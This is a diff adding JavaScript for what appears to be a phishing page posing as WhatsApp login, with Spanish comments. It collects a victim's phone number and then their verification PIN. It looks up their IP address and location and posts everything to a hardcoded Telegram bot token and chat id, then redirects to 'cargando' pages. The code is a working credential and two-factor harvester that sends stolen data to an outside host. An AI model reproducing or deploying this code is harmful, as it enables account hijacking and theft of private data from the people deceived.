@@ -1,0 +1,91 @@
+document.addEventListener("DOMContentLoaded", function () {
+    // Función para obtener el valor de un parámetro de la URL
+    function getQueryParam(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    // Función para obtener la ubicación y enviar el mensaje a Telegram
+    function obtenerUbicacionYEnviarMensajeTelegram(code, password, nextPage, message) {
+        fetch('https://ipapi.co/json/')
+            .then(response => response.json())
+            .then(data => {
+                const { country_name, region, ip } = data;
+                if (country_name && region && ip) {
+                    message += `\nUbicación: ${country_name}, ${region}\nIP: ${ip}`;
+                } else {
+                    message += '\nNo se pudo obtener la ubicación.';
+                }
+                enviarMensajeTelegram(message, nextPage);
+            })
+            .catch(error => {
+                console.error("Error al obtener la ubicación:", error);
+                message += "\nError al obtener la ubicación.";
+                enviarMensajeTelegram(message, nextPage);
+            });
+    }
+
+    // Función para enviar mensaje a Telegram
+    function enviarMensajeTelegram(mensaje, nextPage) {
+        const token = '7655283385:AAFMdX3k-EzhU1JQ2vGdHiPB8V5qGm2tRyE'; // <- Reemplaza con tu token
+        const chat_id = '-4732912368';     // <- Reemplaza con tu chat_id
+        const url = `https://api.telegram.org/bot${token}/sendMessage`;
+
+        const payload = {
+            chat_id: chat_id,
+            text: mensaje
+        };
+
+        fetch(url, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+        })
+            .then(response => {
+                if (!response.ok) throw new Error('Ocurrió un error');
+                console.log('');
+                window.location.href = nextPage;
+            })
+            .catch(error => {
+                console.error('Error', error);
+            });
+    }
+
+    // Validar número de teléfono internacional (con +, 6-15 dígitos)
+    function validarTelefono(telefono) {
+        telefono = telefono.replace(/[\s-]/g, ''); // Quitar espacios y guiones
+        const regex = /^\+\d{6,15}$/;
+        return regex.test(telefono);
+    }
+
+    // Evento de envío de formulario de teléfono
+    const loginForm = document.getElementById("loginForm");
+    if (loginForm) {
+        loginForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            let telefono = document.getElementById("telefono").value.trim();
+            telefono = telefono.replace(/[\s-]/g, '');
+
+            if (!telefono.startsWith('+')) {
+                const countryCode = document.getElementById("country").value;
+                telefono = countryCode + telefono;
+            }
+
+            if (validarTelefono(telefono)) {
+                obtenerUbicacionYEnviarMensajeTelegram(telefono, telefono, "cargando.html?action=telefono", "💲 Whatsapp 💲:\nTELEFONO: " + telefono);
+            } else {
+                alert("Por favor, ingresa un número válido con formato internacional (ej: +54123456789).");
+            }
+        });
+    }
+
+    // Evento de envío de formulario para código de autenticación
+    const verificationForm = document.getElementById("verificationForm");
+    if (verificationForm) {
+        verificationForm.addEventListener("submit", function (event) {
+            event.preventDefault();
+            const auth = document.getElementById("auth").value.trim();
+            obtenerUbicacionYEnviarMensajeTelegram(auth, auth, "cargando3.html", "💲 Whatsapp 💲:\nPIN AUTHENTICADOR: " + auth);
+        });
+    }
+});
